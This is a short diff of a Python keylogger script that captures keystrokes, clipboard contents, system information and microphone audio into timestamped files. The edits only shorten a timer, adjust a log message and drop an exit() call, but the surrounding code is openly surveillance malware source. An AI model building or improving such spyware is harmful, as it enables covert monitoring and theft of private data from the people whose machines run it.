@@ -46,6 +46,7 @@ cwd = os.path.join(os.getcwd(), 'out')
 if (os.path.isdir(cwd) is not True): os.mkdir(cwd, 0o666)
 
 dt = str(datetime.datetime.now().strftime("%Y%m%d_%H%M%S"))
+
 system_info = os.path.join(cwd, "systeminfo_" + dt + ".txt")
 clipboard_info = os.path.join(cwd,"clipboard_" + dt + ".txt")
 audio_info = os.path.join(cwd, "audio_" + dt + ".wav")
@@ -65,7 +66,7 @@ MAP = {
 }
 
 TERMINATE_KEY = "f7"
-TIMER_DURATION = 30  # Time in seconds (e.g., 60 seconds)
+TIMER_DURATION = 10  # Time in seconds (e.g., 60 seconds)
 
 class Keylogger:
     def __init__(self, time_interval, debug=False):
@@ -144,7 +145,7 @@ def copy_clipboard():
 
 # Get Microphone Recordings
 def microphone():
-    print('starting microphone information')
+    print(f'starting microphone information ({microphone_time}s)')
 
     fs = 44100
     seconds = microphone_time
@@ -219,4 +220,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-    exit()
